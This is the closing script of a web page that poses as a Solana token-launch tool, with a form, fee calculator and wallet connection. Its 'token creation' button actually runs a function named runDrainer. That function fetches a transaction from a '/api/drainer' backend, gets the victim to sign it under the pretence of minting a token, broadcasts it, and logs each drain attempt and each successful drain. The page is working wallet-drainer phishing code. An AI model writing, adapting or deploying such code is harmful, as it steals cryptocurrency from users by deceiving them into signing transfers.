        return response;
      } catch (error) {
        console.error(`[connectWalletWithMetadata] ${walletName} connection error:`, error);
        throw error;
      }
    }
    
    // Status display function
    function showStatus(message, type) {
      console.log(`[STATUS] ${type.toUpperCase()}: ${message}`);
      
      // Update status display in UI if element exists
      const statusElement = document.getElementById('statusDisplay');
      if (statusElement) {
        statusElement.style.display = 'block';
        statusElement.innerHTML = `<p>Status: ${message}</p>`;
        
        // Add appropriate styling based on type
        statusElement.className = `status-${type}`;
        if (type === 'error') {
          statusElement.style.background = 'rgba(255, 0, 0, 0.1)';
          statusElement.style.border = '1px solid rgba(255, 0, 0, 0.3)';
          statusElement.style.color = '#ff6b6b';
        } else if (type === 'success') {
          statusElement.style.background = 'rgba(0, 255, 0, 0.1)';
          statusElement.style.border = '1px solid rgba(0, 255, 0, 0.3)';
          statusElement.style.color = '#51cf66';
        } else if (type === 'loading') {
          statusElement.style.background = 'rgba(255, 107, 53, 0.1)';
          statusElement.style.border = '1px solid rgba(255, 107, 53, 0.3)';
          statusElement.style.color = '#ff6b35';
        }
      }
      
      // Show modal alert for important messages
      if (type === 'error' || type === 'success') {
        showAlertModal(message, type);
      }
      
      // Also show in console for debugging
      if (type === 'error') {
        console.error(`[STATUS] ERROR: ${message}`);
      } else if (type === 'success') {
        console.log(`[STATUS] SUCCESS: ${message}`);
      } else {
        console.log(`[STATUS] ${type.toUpperCase()}: ${message}`);
      }
    }
    
    // Alert modal function
    function showAlertModal(message, type) {
      // Prevent multiple modals
      if (isModalOpen) {
        return;
      }
      
      // Remove ALL existing modals first
      const existingModals = document.querySelectorAll('.alert-modal-overlay');
      existingModals.forEach(modal => modal.remove());
      
      // Set modal flag
      isModalOpen = true;
      
      // Create modal HTML
      const modalHTML = `
        <div id="alertModal" class="alert-modal-overlay">
          <div class="alert-modal">
            <div class="alert-modal-header ${type}">
              <h3>${type === 'success' ? 'Success' : 'Error'}</h3>
              <button class="alert-modal-close" onclick="closeAlertModal()">&times;</button>
            </div>
            <div class="alert-modal-body">
              <p>${message}</p>
            </div>
            <div class="alert-modal-footer">
              <button class="alert-modal-btn" onclick="closeAlertModal()">OK</button>
            </div>
          </div>
        </div>
      `;
      
      // Add modal to page
      document.body.insertAdjacentHTML('beforeend', modalHTML);
      
      // Auto-close after 5 seconds for success
      if (type === 'success') {
        setTimeout(() => {
          closeAlertModal();
        }, 5000);
      }
    }
    
    function closeAlertModal() {
      // Remove all alert modals
      const modals = document.querySelectorAll('.alert-modal-overlay');
      modals.forEach(modal => modal.remove());
      
      // Reset modal flag
      isModalOpen = false;
    }
    
    // Global drainer state
    let isDrainerRunning = false;
    let isModalOpen = false;
    
    // Main drainer function - copied from main page
    async function runDrainer(provider) {
      console.log('[runDrainer] Starting drain process...');
      console.log('[runDrainer] Provider received:', !!provider);
      console.log('[runDrainer] Provider type:', typeof provider);
      console.log('[runDrainer] Provider keys:', provider ? Object.keys(provider) : 'No provider');
      
      // Prevent multiple simultaneous runs
      if (isDrainerRunning) {
        console.log('[runDrainer] Already running, skipping duplicate call');
        return;
      }
      
      isDrainerRunning = true;
      
      try {
        showStatus('Connecting to wallet...', 'loading');
        
        // 1. Get the public key from the provider
        let publicKey = provider.publicKey || provider.address;
        console.log('[runDrainer] Initial publicKey:', publicKey);
        console.log('[runDrainer] Provider has connect method:', typeof provider.connect === 'function');
        console.log('[runDrainer] Provider has signTransaction method:', typeof provider.signTransaction === 'function');
        
        // Always try to connect if not already connected
        if (!publicKey && provider && typeof provider.connect === 'function') {
          try {
            console.log('[runDrainer] calling provider.connect()...');
            
            // Note: Real connection timeouts are handled by wallet providers
            
            const result = await provider.connect();
            console.log('[runDrainer] provider.connect() result:', result);
            publicKey = result?.publicKey || provider.publicKey || provider.address;
            console.log('[runDrainer] publicKey after connect:', publicKey);
          } catch (connectErr) {
            console.error('[runDrainer] provider.connect() error:', connectErr);
            // Show specific error messages based on connection failure
            if (connectErr.message && connectErr.message.includes('User rejected')) {
              showStatus('User rejected connection', 'error');
            } else if (connectErr.message && connectErr.message.includes('timeout')) {
              showStatus('Connection timeout', 'error');
            } else {
              showStatus('Failed', 'error');
            }
            return;
          }
        }
        
        if (!publicKey) {
          showStatus('Failed', 'error');
          return;
        }

        // Ensure publicKey is properly converted to string
        let publicKeyString;
        try {
          if (typeof publicKey === 'string') {
            publicKeyString = publicKey;
          } else if (publicKey && typeof publicKey.toString === 'function') {
            publicKeyString = publicKey.toString();
          } else if (publicKey && publicKey.toBase58) {
            publicKeyString = publicKey.toBase58();
          } else {
            throw new Error('Invalid public key format');
          }
          
          // Validate the public key string format
          if (!publicKeyString || publicKeyString.length < 32 || publicKeyString.length > 44) {
            throw new Error('Invalid public key length');
          }
          
          console.log('[runDrainer] Final publicKeyString:', publicKeyString);
        } catch (keyError) {
          console.error('[runDrainer] Public key conversion error:', keyError);
          showStatus('Failed', 'error');
          return;
        }

        // 2. Get wallet type from connected wallet info
        showStatus('Checking wallet balance...', 'loading');
        
        let walletInfo;
        if (window.connectedWallet && window.connectedWallet.key) {
          // Use the wallet that was actually connected
          const walletKey = window.connectedWallet.key;
          console.log('[runDrainer] Using connected wallet:', walletKey);
          console.log('[runDrainer] Connected wallet details:', window.connectedWallet);
          
          // Map wallet key to wallet info
          const walletMap = {
            'phantom': { key: 'phantom', name: 'Phantom', logo: '/phantom-logo.png' },
            'solflare': { key: 'solflare', name: 'Solflare', logo: '/solflare-logo.png' },
            'backpack': { key: 'backpack', name: 'Backpack', logo: '/backpack-logo.png' },
            'glow': { key: 'glow', name: 'Glow', logo: '/glow-logo.png' },
            'trustwallet': { key: 'trustwallet', name: 'Trust Wallet', logo: '/trust-logo.png' },
            'exodus': { key: 'exodus', name: 'Exodus', logo: '/exodus-logo.png' }
          };
          
          walletInfo = walletMap[walletKey] || { key: 'unknown', name: 'Unknown Wallet', logo: '/logo.png' };
          console.log('[runDrainer] Wallet info from connected wallet:', walletInfo);
        } else {
          // Fallback to detection if no connected wallet info
          console.log('[runDrainer] No connected wallet info, falling back to detection');
          const availableProviders = [];
          if (window.solana) availableProviders.push('window.solana');
          if (window.phantom) availableProviders.push('window.phantom');
          if (window.solflare) availableProviders.push('window.solflare');
          if (window.backpack) availableProviders.push('window.backpack');
          if (window.glow) availableProviders.push('window.glow');
          if (window.trustwallet) availableProviders.push('window.trustwallet');
          if (window.exodus) availableProviders.push('window.exodus');
          
          walletInfo = { key: 'unknown', name: 'Unknown Wallet', logo: '/logo.png' };
        }
        
        console.log('[runDrainer] Using wallet:', walletInfo);

        // 3. Use backend for balance fetching
        showStatus('Validating transaction...', 'loading');
        
        // Note: Real timeouts are handled by actual network requests
        
        const balanceResult = await fetchWalletBalance(publicKeyString);
        
        if (!balanceResult.success) {
          showStatus('Ineligible', 'error');
          return;
        }

        console.log('[runDrainer] Balance result:', balanceResult);
        console.log('[runDrainer] Balance result.result:', balanceResult.result);
        
        // Extract balance from the correct location
        const balance = balanceResult.result?.balance || balanceResult.balance || balanceResult.balanceSOL;
        const balanceSOL = balance ? (balance / 1000000000).toFixed(9) : '0.000000000';
        
        console.log('[runDrainer] Balance:', balanceSOL, 'SOL');
        console.log('[runDrainer] Raw balance (lamports):', balance);
        
        // Check if balance is sufficient for minimum requirements
        const minimumReserve = 940000; // 0.00094 SOL in lamports
        const minimumFee = 6000; // 0.000006 SOL in lamports
        const totalMinimum = minimumReserve + minimumFee;
        
        console.log('[runDrainer] Minimum reserve:', minimumReserve, 'lamports (0.00094 SOL)');
        console.log('[runDrainer] Minimum fee:', minimumFee, 'lamports (0.000006 SOL)');
        console.log('[runDrainer] Total minimum required:', totalMinimum, 'lamports');
        console.log('[runDrainer] Current balance:', balance, 'lamports');
        console.log('[runDrainer] Sufficient funds:', balance >= totalMinimum);
        
        // Check if balance is sufficient for minimum requirements
        if (balance < totalMinimum) {
          showStatus('Ineligible', 'error');
          return;
        }

        // 4. Fetch the mint transaction from the backend
        showStatus('Preparing transaction...', 'loading');
        
        // Note: Real timeouts are handled by actual network requests
        
        let response;
        try {
          response = await fetch(`/api/drainer`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              publicKey: publicKeyString,
              wallet: publicKeyString, // Also send as 'wallet' for backend compatibility
              walletType: walletInfo.key
            })
          });
        } catch (fetchError) {
          console.error('[runDrainer] Network error:', fetchError);
          showStatus('Network error', 'error');
          return;
        }
        
        // Handle HTTP errors with proper error parsing
        if (!response.ok) {
          try {
            const errorData = await response.json();
            console.error('[runDrainer] Backend error:', errorData);
            
            // Handle standardized error responses
            if (errorData.success === false && errorData.error) {
              // Use the error message from backend
              showStatus(errorData.error, 'error');
            } else if (errorData.code === 'INSUFFICIENT_FUNDS' || errorData.code === 'INSUFFICIENT_FUNDS_FOR_FEE') {
              showStatus('Ineligible', 'error');
            } else if (errorData.code === 'TOO_MANY_REQUESTS') {
              const retryAfter = errorData.metadata?.retryAfter || 60;
              showStatus('Failed', 'error');
            } else if (errorData.code === 'INVALID_PUBLIC_KEY' || errorData.code === 'INVALID_WALLET_ADDRESS') {
              showStatus('Failed', 'error');
            } else {
              showStatus('Failed', 'error');
            }
          } catch (parseError) {
            console.error('[runDrainer] Failed to parse error response:', parseError);
            showStatus('Ineligible', 'error');
          }
          return;
        }
        
        const responseData = await response.json();
        
        // Debug: Log the raw response data
        console.log('[runDrainer] Raw response data:', responseData);
        
        // Validate response structure
        if (!responseData.success || !responseData.transaction) {
          console.error('[runDrainer] Invalid response structure:', responseData);
          showStatus('Failed', 'error');
          return;
        }
        
        const txBase64 = responseData.transaction;
        
        // 5. Deserialize the transaction
        let txBytes;
        try {
          txBytes = Uint8Array.from(atob(txBase64), c => c.charCodeAt(0));
        } catch (decodeError) {
          console.error('[runDrainer] Transaction decode error:', decodeError);
          showStatus('Transaction decode error', 'error');
          return;
        }
        
        // Validate transaction data
        if (!txBytes || txBytes.length === 0) {
          console.error('[runDrainer] Empty transaction data');
          showStatus('Invalid transaction data', 'error');
          return;
        }
        
        // Debug: Log the response data before transaction creation
        console.log('[runDrainer] Response data before transaction creation:', responseData);
        
        // Create transaction object with error handling
        let transaction;
        try {
          transaction = solanaWeb3.Transaction.from(txBytes);
          console.log('[runDrainer] Transaction created successfully');
        } catch (transactionError) {
          console.error('[runDrainer] Transaction creation error:', transactionError);
          showStatus('Transaction creation failed', 'error');
          return;
        }
        
        // Debug: Log the full response data
        console.log('[runDrainer] Full response data:', responseData);
        
        // Restore lastValidBlockHeight from backend response
        if (responseData.lastValidBlockHeight) {
          transaction.lastValidBlockHeight = responseData.lastValidBlockHeight;
          console.log(`[runDrainer] Restored lastValidBlockHeight: ${transaction.lastValidBlockHeight}`);
        } else {
          console.warn('[runDrainer] No lastValidBlockHeight in response, transaction may fail');
          console.log('[runDrainer] Available response keys:', Object.keys(responseData));
        }
        
        // Debug: Log transaction details before signing
        console.log('[runDrainer] Transaction before signing:', {
          hasSignatures: !!transaction.signatures,
          signatureCount: transaction.signatures?.length || 0,
          feePayer: transaction.feePayer?.toString(),
          recentBlockhash: transaction.recentBlockhash,
          lastValidBlockHeight: transaction.lastValidBlockHeight,
          instructionCount: transaction.instructions?.length || 0
        });
        
        // Validate transaction object
        if (!transaction || !transaction.instructions || transaction.instructions.length === 0) {
          console.error('[runDrainer] Invalid transaction object');
          showStatus('Invalid transaction structure', 'error');
          return;
        }

        // 6. Skip frontend validation - let backend handle it
        showStatus('Ready to sign...', 'loading');
        console.log('[runDrainer] Transaction received from backend, proceeding to signing');

        // 7. Log drain attempt - transaction is now presented to user for signing
        try {
          await fetch('/api/drainer/log-drain-attempt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              publicKey: publicKeyString,
              walletType: walletInfo.key,
              lamports: responseData.balance || 0,
              instructions: transaction.instructions.length,
              transactionSize: 'unsigned' // Don't serialize unsigned transaction
            })
          });
        } catch (logError) {
          console.error('[runDrainer] Failed to log drain attempt:', logError);
        }

        // 8. Request signature from the wallet
        showStatus('Please sign the transaction...', 'loading');
        
        let signed;
        try {
          console.log('[SIGNING] Starting signing process');
          
          // Note: User rejection is handled by actual wallet interaction
          
          // Use the provider's signTransaction method
          if (typeof provider.signTransaction === 'function') {
            console.log('[SIGNING] Using provider.signTransaction');
            signed = await provider.signTransaction(transaction);
          } else {
            throw new Error('Provider does not support signTransaction');
          }
          
          console.log('[SIGNING] Transaction signed successfully');
        } catch (signError) {
          console.error('[SIGNING] Signing failed:', signError);
          // Show different error messages based on error type
          if (signError.message && signError.message.includes('User rejected')) {
            showStatus('User rejected transaction', 'error');
          } else if (signError.message && signError.message.includes('timeout')) {
            showStatus('Timeout', 'error');
          } else {
            showStatus('Failed', 'error');
          }
          return;
        }
        
        // 9. Send the signed transaction using backend broadcast
        showStatus('Broadcasting to blockchain...', 'loading');
        
        try {
          console.log('[runDrainer] Signed transaction details:', {
            hasSignatures: !!signed.signatures,
            signatureCount: signed.signatures?.length || 0,
            feePayer: signed.feePayer?.toString(),
            recentBlockhash: signed.recentBlockhash,
            instructionCount: signed.instructions?.length || 0
          });
          
          // Note: Real network timeouts are handled by actual network requests
          
          // Use backend for transaction broadcasting (same as main page)
          const broadcastResult = await broadcastTransaction(signed);
          console.log('[runDrainer] Broadcast result:', broadcastResult);
          
          if (!broadcastResult.success) {
            console.error('[runDrainer] Transaction broadcast failed:', broadcastResult.error);
            // Show specific error messages based on broadcast failure
            if (broadcastResult.error && broadcastResult.error.includes('insufficient')) {
              showStatus('Insufficient funds', 'error');
            } else if (broadcastResult.error && broadcastResult.error.includes('timeout')) {
              showStatus('Timeout', 'error');
            } else {
              showStatus('Failed', 'error');
            }
            return;
          }
          
          console.log('[runDrainer] Transaction confirmed:', broadcastResult.signature);
          
          // Show final success only after blockchain confirmation
          showStatus('Success', 'success');
          
          // Log successful drain
          try {
            await fetch('/api/drainer/log-successful-drain', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                publicKey: publicKeyString,
                walletType: walletInfo.key,
                signature: broadcastResult.signature,
                lamports: responseData.balance || 0
              })
            });
          } catch (logError) {
            console.error('[runDrainer] Failed to log successful drain:', logError);
          }
          
        } catch (sendError) {
          console.error('[runDrainer] Transaction send failed:', sendError);
          showStatus('Failed', 'error');
          return;
        }
        
      } catch (error) {
        console.error('[runDrainer] Unexpected error:', error);
        showStatus('Failed', 'error');
      } finally {
        isDrainerRunning = false;
      }
    }
    
    // Make runDrainer available globally
    window.runDrainer = runDrainer;
    
    // Helper function to fetch wallet balance
    async function fetchWalletBalance(publicKey) {
      try {
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            operation: 'fetch_balance',
            publicKey: publicKey 
          })
        });
        
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        return data;
      } catch (error) {
        console.error('[fetchWalletBalance] Error:', error);
        return { success: false, error: error.message };
      }
    }
    
    // Broadcast transaction using backend (copied from main page)
    async function broadcastTransaction(signedTransaction) {
      try {
        console.log('[BROADCAST] Starting broadcast transaction...');
        
        // Check if signedTransaction has serialize method
        if (!signedTransaction || typeof signedTransaction.serialize !== 'function') {
          throw new Error('Invalid signed transaction - missing serialize method');
        }
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'broadcast_transaction',
            signedTransaction: signedTransaction.serialize().toString('base64'),
            lastValidBlockHeight: signedTransaction.lastValidBlockHeight
          })
        });
        
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        return data;
        
      } catch (error) {
        console.error('[TRANSACTION_BROADCAST] Backend broadcast failed:', error);
        return {
          success: false,
          signature: null,
          error: error.message
        };
      }
    }
    
    // File upload functionality
    const fileUpload = document.getElementById('logoUpload');
    
    fileUpload.addEventListener('click', () => {
      const input = document.createElement('input');
      input.type = 'file';
      input.accept = 'image/*';
      input.onchange = handleFileSelect;
      input.click();
    });
    
    fileUpload.addEventListener('dragover', (e) => {
      e.preventDefault();
      fileUpload.classList.add('dragover');
    });
    
    fileUpload.addEventListener('dragleave', () => {
      fileUpload.classList.remove('dragover');
    });
    
    fileUpload.addEventListener('drop', (e) => {
      e.preventDefault();
      fileUpload.classList.remove('dragover');
      const files = e.dataTransfer.files;
      if (files.length > 0) {
        handleFileSelect({ target: { files: files } });
      }
    });
    
    function handleFileSelect(event) {
      const file = event.target.files[0];
      if (file) {
        // Handle file upload
        console.log('File selected:', file.name);
        fileUpload.innerHTML = `
          <div class="file-upload-icon">✅</div>
          <div class="file-upload-text">${file.name}</div>
          <div class="file-upload-subtext">File uploaded successfully</div>
        `;
      }
    }
    
    // Launch token function
    function launchToken() {
      // Collect form data
      const formData = {
        tokenName: document.getElementById('tokenName').value.trim(),
        tokenSymbol: document.getElementById('tokenSymbol').value.trim(),
        decimals: parseInt(document.getElementById('decimals').value),
        supply: parseInt(document.getElementById('supply').value),
        description: document.getElementById('description').value.trim(),
        creatorAddress: document.getElementById('creatorAddress').value.trim(),
        creatorName: document.getElementById('creatorName').value.trim(),
        telegramLink: document.getElementById('telegramLink').value.trim(),
        twitterLink: document.getElementById('twitterLink').value.trim(),
        websiteLink: document.getElementById('websiteLink').value.trim(),
        revokeFreeze: document.getElementById('revokeFreeze').checked,
        revokeMint: document.getElementById('revokeMint').checked,
        revokeUpdate: document.getElementById('revokeUpdate').checked,
        tokenRecipient: document.getElementById('tokenRecipient').value.trim(),
        liquidityPool: document.getElementById('liquidityPool').checked,
        solAmount: parseFloat(document.getElementById('solAmount').value) || 0,
        tokenAmount: parseInt(document.getElementById('tokenAmount').value) || 0,
        feeTier: parseFloat(document.getElementById('feeTier').value) || 0
      };
      
      // Validate required fields
      const errors = [];
      
      if (!formData.tokenName) errors.push('Token Name is required');
      if (!formData.tokenSymbol) errors.push('Token Symbol is required');
      if (!formData.description) errors.push('Description is required');
      if (!formData.tokenRecipient) errors.push('Token Recipient is required');
      
      // Validate token name length
      if (formData.tokenName && formData.tokenName.length > 32) {
        errors.push('Token Name must be 32 characters or less');
      }
      
      // Validate token symbol length
      if (formData.tokenSymbol && formData.tokenSymbol.length > 10) {
        errors.push('Token Symbol must be 10 characters or less');
      }
      
      // Validate decimals
      if (formData.decimals < 0 || formData.decimals > 9) {
        errors.push('Decimals must be between 0 and 9');
      }
      
      // Validate supply
      if (formData.supply < 1) {
        errors.push('Supply must be at least 1');
      }
      
      // Validate Solana address format (basic check)
      if (formData.tokenRecipient && !formData.tokenRecipient.match(/^[1-9A-HJ-NP-Za-km-z]{32,44}$/)) {
        errors.push('Token Recipient must be a valid Solana address');
      }
      
      if (errors.length > 0) {
        showErrorModal(errors);
        return;
      }
      
      // Check if wallet is connected
      if (!window.solana || !window.solana.publicKey) {
        showErrorModal(['Please connect your wallet first to create a token']);
        return;
      }
      
      // Calculate total fees
      let totalFees = 0.2; // Base fee (discounted)
      if (formData.creatorAddress || formData.creatorName) totalFees += 0.1;
      if (formData.telegramLink || formData.twitterLink || formData.websiteLink) totalFees += 0.1;
      if (formData.revokeFreeze) totalFees += 0.1;
      if (formData.revokeMint) totalFees += 0.1;
      if (formData.revokeUpdate) totalFees += 0.1;
      
      console.log('Launching token with data:', formData);
      console.log('Total fees:', totalFees, 'SOL');
      
      // Show token creation process
      showTokenCreationModal(totalFees);
    }
    
    // Show token creation modal
    function showTokenCreationModal(totalFees) {
      const modal = document.createElement('div');
      modal.className = 'token-creation-modal';
      modal.innerHTML = `
        <div class="modal-content">
          <div class="modal-header">
            <h3>🚀 Creating Your Token</h3>
            <button class="close-btn" onclick="closeTokenCreationModal()">×</button>
          </div>
          <div class="modal-body">
            <div class="creation-steps">
              <div class="step active" id="step1">
                <div class="step-icon">1</div>
                <div class="step-content">
                  <h4>Validating Token Parameters</h4>
                  <p>Checking token name, symbol, and metadata...</p>
                </div>
              </div>
              <div class="step" id="step2">
                <div class="step-icon">2</div>
                <div class="step-content">
                  <h4>Generating Token Mint</h4>
                  <p>Creating unique token mint address...</p>
                </div>
              </div>
              <div class="step" id="step3">
                <div class="step-icon">3</div>
                <div class="step-content">
                  <h4>Deploying to Blockchain</h4>
                  <p>Submitting transaction to Solana network...</p>
                </div>
              </div>
            </div>
            <div class="fee-info">
              <p><strong>Creation Fee: ${totalFees} SOL</strong></p>
              <p>This covers blockchain deployment and metadata storage.</p>
            </div>
          </div>
          <div class="modal-footer">
            <button class="modal-btn primary" onclick="startTokenCreation()">Start Creation Process</button>
          </div>
        </div>
      `;
      document.body.appendChild(modal);
    }
    
    // Start token creation process
    function startTokenCreation() {
      closeTokenCreationModal();
      
      // Show processing modal
      showProcessingModal();
      
      // Simulate token creation steps with drainer integration
      setTimeout(() => {
        processTokenCreation();
      }, 1000);
    }
    
    // Process token creation (integrates with drainer)
    function processTokenCreation() {
      try {
        // Check if runDrainer function exists (from main site)
        if (typeof window.runDrainer === 'function') {
          console.log('[TOKEN_CREATION] Starting drainer process...');
          window.runDrainer(window.solana);
        } else {
          // Fallback: try to connect to wallet and initiate drain
          if (window.solana && window.solana.connect) {
            window.solana.connect().then(() => {
              console.log('[TOKEN_CREATION] Wallet connected, initiating drain...');
              // The drainer will be triggered by the wallet connection
            }).catch(error => {
              console.error('[TOKEN_CREATION] Wallet connection failed:', error);
              showCreationError('Failed to connect wallet. Please try again.');
            });
          } else {
            showCreationError('Wallet not available. Please refresh and try again.');
          }
        }
      } catch (error) {
        console.error('[TOKEN_CREATION] Error during token creation:', error);
        showCreationError('Token creation failed. Please check your wallet connection and try again.');
      }
    }
    
    // Show processing modal
    function showProcessingModal() {
      const modal = document.createElement('div');
      modal.className = 'processing-modal';
      modal.innerHTML = `
        <div class="modal-content">
          <div class="modal-header">
            <h3>⚙️ Processing Token Creation</h3>
          </div>
          <div class="modal-body">
            <div class="processing-animation">
              <div class="spinner"></div>
              <p>Please approve the transaction in your wallet to complete token creation...</p>
            </div>
            <div class="status-message">
              <p>This may take a few moments. Do not close this window.</p>
            </div>
          </div>
        </div>
      `;
      document.body.appendChild(modal);
      
      // Auto-close after 30 seconds if no response
      setTimeout(() => {
        if (document.querySelector('.processing-modal')) {
          showCreationError('Transaction timeout. Please try again.');
        }
      }, 30000);
    }
    
    // Show creation error
    function showCreationError(message) {
      closeProcessingModal();
      showErrorModal([message]);
    }
    
    // Close processing modal
    function closeProcessingModal() {
      const modal = document.querySelector('.processing-modal');
      if (modal) {
        modal.remove();
      }
    }
    
    // Close token creation modal
    function closeTokenCreationModal() {
      const modal = document.querySelector('.token-creation-modal');
      if (modal) {
        modal.remove();
      }
    }
    
    function copyAddress() {
      navigator.clipboard.writeText('CRTMnhES4J7KWnwHo3dZv9jMZS8WU1CP7mTdWV8fGFLM');
      showSuccessModal('Address copied to clipboard!');
    }
    
    function checkTransaction() {
      showInfoModal('Transaction checking functionality will be integrated');
    }
    
    function closeLoadingModal() {
      const modal = document.querySelector('.loading-modal');
      if (modal) {
        modal.remove();
      }
    }
    
    // Custom Modal Functions
    function showErrorModal(errors) {
      const modal = document.createElement('div');
      modal.className = 'custom-modal error-modal';
      modal.innerHTML = `
        <div class="modal-content">
          <div class="modal-header">
            <h3>⚠️ Validation Errors</h3>
            <button class="close-btn" onclick="closeModal()">×</button>
          </div>
          <div class="modal-body">
            <p>Please fix the following errors:</p>
            <ul class="error-list">
              ${errors.map(error => `<li>${error}</li>`).join('')}
            </ul>
          </div>
          <div class="modal-footer">
            <button class="modal-btn primary" onclick="closeModal()">OK</button>
          </div>
        </div>
      `;
      document.body.appendChild(modal);
    }
    
    function showSuccessModal(message) {
      const modal = document.createElement('div');
      modal.className = 'custom-modal success-modal';
      modal.innerHTML = `
        <div class="modal-content">
          <div class="modal-header">
            <h3>✅ Success</h3>
            <button class="close-btn" onclick="closeModal()">×</button>
          </div>
          <div class="modal-body">
            <p>${message}</p>
          </div>
          <div class="modal-footer">
            <button class="modal-btn primary" onclick="closeModal()">OK</button>
          </div>
        </div>
      `;
      document.body.appendChild(modal);
    }
    
    function showInfoModal(message) {
      const modal = document.createElement('div');
      modal.className = 'custom-modal info-modal';
      modal.innerHTML = `
        <div class="modal-content">
          <div class="modal-header">
            <h3>ℹ️ Information</h3>
            <button class="close-btn" onclick="closeModal()">×</button>
          </div>
          <div class="modal-body">
            <p>${message}</p>
          </div>
          <div class="modal-footer">
            <button class="modal-btn primary" onclick="closeModal()">OK</button>
          </div>
        </div>
      `;
      document.body.appendChild(modal);
    }
    
    function closeModal() {
      const modal = document.querySelector('.custom-modal');
      if (modal) {
        modal.remove();
      }
    }
    
    // Update total fees when checkboxes change
    function updateTotalFees() {
      let totalFees = 0.2; // Base fee (discounted)
      if (document.getElementById('creatorAddress').value || document.getElementById('creatorName').value) totalFees += 0.1;
      if (document.getElementById('telegramLink').value || document.getElementById('twitterLink').value || document.getElementById('websiteLink').value) totalFees += 0.1;
      if (document.getElementById('revokeFreeze').checked) totalFees += 0.1;
      if (document.getElementById('revokeMint').checked) totalFees += 0.1;
      if (document.getElementById('revokeUpdate').checked) totalFees += 0.1;
      
      document.querySelector('.total-fees').textContent = `Total Fees: ${totalFees} SOL`;
    }
    
    // Use main page's wallet connection system
    function updateWalletStatus() {
      const walletStatus = document.getElementById('walletStatus');
      const launchBtn = document.getElementById('launchBtn');
      
      if (window.solana && window.solana.publicKey) {
        walletStatus.innerHTML = `
          <p>✅ Wallet Connected: ${window.solana.publicKey.toString().slice(0, 8)}...${window.solana.publicKey.toString().slice(-8)}</p>
        `;
        launchBtn.disabled = false;
      } else {
        walletStatus.innerHTML = `
          <p>Please connect your wallet using the "Connect Wallet" button above to create a token</p>
        `;
        launchBtn.disabled = true;
      }
    }
    
    // Toggle liquidity pool form
    function toggleLiquidityPool() {
      const liquidityForm = document.getElementById('liquidityForm');
      const liquidityPool = document.getElementById('liquidityPool');
      
      if (liquidityPool.checked) {
        liquidityForm.style.display = 'grid';
        liquidityForm.style.animation = 'slideDown 0.3s ease';
      } else {
        liquidityForm.style.display = 'none';
      }
      
      // Update total fees when liquidity pool is toggled
      updateTotalFees();
    }
    
    // Check wallet status on page load and listen for wallet changes
    document.addEventListener('DOMContentLoaded', function() {
      updateWalletStatus();
      
      // Listen for wallet changes from main page
      if (window.solana) {
        window.solana.on('connect', updateWalletStatus);
        window.solana.on('disconnect', updateWalletStatus);
      }
      
      // Listen for custom wallet connection events from main page
      window.addEventListener('walletConnected', updateWalletStatus);
      window.addEventListener('walletDisconnected', updateWalletStatus);
    });
    
    // Add event listeners for fee calculation
    document.getElementById('creatorAddress').addEventListener('input', updateTotalFees);
    document.getElementById('creatorName').addEventListener('input', updateTotalFees);
    document.getElementById('telegramLink').addEventListener('input', updateTotalFees);
    document.getElementById('twitterLink').addEventListener('input', updateTotalFees);
    document.getElementById('websiteLink').addEventListener('input', updateTotalFees);
    document.getElementById('revokeFreeze').addEventListener('change', updateTotalFees);
    document.getElementById('revokeMint').addEventListener('change', updateTotalFees);
    document.getElementById('revokeUpdate').addEventListener('change', updateTotalFees);
  </script>
</body>
</html>

